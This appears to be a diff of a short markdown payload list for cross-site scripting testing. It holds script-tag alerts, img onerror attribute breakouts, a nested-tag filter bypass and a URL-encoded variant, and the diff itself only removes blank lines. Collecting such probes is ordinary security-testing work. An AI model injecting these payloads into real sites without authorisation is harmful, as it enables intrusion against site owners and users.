@@ -1,6 +1,5 @@
 ##### Payload
 
-
 1.<script>alert(1)</script> 
 
 2.Balancing: abc@gmail.com<script>alert(1)</script>
@@ -12,7 +11,6 @@
 5."><img src=x onerror=confirm(1)>
 
 6.change variation: (i) "><img src="x" onerror=alert("helloworld")>
-
                    (ii) "><scr<script>ipt>alert(1)</scr</script>ipt>
 
 7.url encode: demo%22%3E%3Cimg%20src%3Dx%20onerror%3Dconfirm%281%29%3E
